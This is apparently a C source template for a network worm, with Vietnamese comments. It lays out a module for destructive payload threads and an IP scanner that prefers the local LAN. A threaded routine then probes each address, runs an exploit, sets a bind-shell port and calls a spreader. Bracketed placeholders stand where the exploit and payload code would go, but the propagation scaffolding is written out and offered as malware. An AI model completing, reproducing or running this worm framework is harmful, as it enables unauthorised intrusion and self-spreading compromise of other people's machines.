// gcc -o hostip hostip.c -lws2_32

#include "hostip.h"
int main(int argc, char** argv){

////**********************************************************************
//							Malicious function
// Mô-đun này gọi ra các chức năng phá hoại mà malware được cài đặt. Mỗi 
// tính năng sẽ được gọi thành một thread để độc lập thực hiện các tính năng 
// đó. Có thể mở rộng ra bằng cách ghi riêng xuống đĩa một tập tin thực thi 
// mới và chạy độc lập với malware.
// Note:
// 	1. CreateThread() gọi hàm thực hiện chức năng phá hoại.
// 	2. Khai báo hàm phá hoại dạng: 
// 			ULONG WINAPI Botnet_worker (LPVOID lpParam);
// 	3. Các hàm phá hoại đặt cuối đoạn code để dễ kiểm tra.
////**********************************************************************

[malFunc]

////**********************************************************************
//							Scaning function
//Mô-đun này có nhiệm vụ scan IP để tìm ra target phù hợp. Thực hiện
//scan theo cách ngẫu nhiên chọn một dãy IP (ưu tiên chọn IP trong miền
//LAN của máy đang chạy worm với giả định những máy trong cùng mạng sẽ
//cùng cấu hình và hệ điều hành). Scan lần lượt 20 IP => tạo 10 thread 
//để chờ kết quả, có timeout mặc định hệ thống.
//Note: 
// 1. Scanner1 có nhiệm vụ chọn range ip để scan
// 2. Scanner2 quyết định cách chọn ip trong range đã chọn. Ngẫu nhiên
// hay tuần tự.
////**********************************************************************
	[main]
	// int  ipAddress[4];
	// randomChooseIP(ipAddress);
	// for (;;){
	// 	initAttack(ipAddress);
	// }
	// WSACleanup();
}

[function]

//Hàm initAttack chỉ xuất hiện nếu mã độc có chứa mã khai thác dạng
//remote code execution
void initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
	
	//[repeate]
	for(i=0; i<MAX_THREADS;i++){
		[increaseIP](ipAddress);
		// Allocate memory for thread data.
		pDataArray[i] = (PthreadData) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,sizeof(threadData));
		if( pDataArray[i] == NULL ){
           // If the array allocation fails, the system is out of memory
           // so there is no point in trying to print an error message.
           // Just terminate execution.
			printf("out of memory!\n");
            ExitProcess(2);
        }
        //init data
        //lưu ý xử lý bindport cho từng exploit
        ipAr2Str(ipAddress,pDataArray[i]->strIP);
        pDataArray[i]->SHELLPORT=BINDPORT;
        
        hThreadArray[i] = CreateThread( 
            NULL,                   
            0,                        
            exploit,       			// thread function name
            pDataArray[i],          
            0,                      
            &dwThreadIdArray[i]);   
		if (hThreadArray[i] == NULL) {
			printf("Thread %d is not create!\n",i );
        }
        else{
        	printf("Thread %d is create!\n",i );
        }
	}
	//Đợi tất cả các threads được tắt
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);
	for(int i=0; i<MAX_THREADS; i++){
        CloseHandle(hThreadArray[i]);
        if(pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL;    // Ensure address is not reused.
        }
    }

    //[repeate]
}

DWORD WINAPI exploit( LPVOID lpParam ){
	PthreadData pDataArray;
	pDataArray = (PthreadData)lpParam;
	int sock;
	sock=[isExploit](pDataArray->strIP);
	if(sock){
		printf("victim: %s\n",pDataArray->strIP);
		[exploitTarget](sock,pDataArray->strIP);
		int a;
		a=[Spreader](pDataArray->strIP,pDataArray->SHELLPORT);
		printf("DEBUG %d\n",a);
	}else
	{
		printf("ip: %s can't exploit!\n",pDataArray->strIP);
	}
	return 0;
}

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
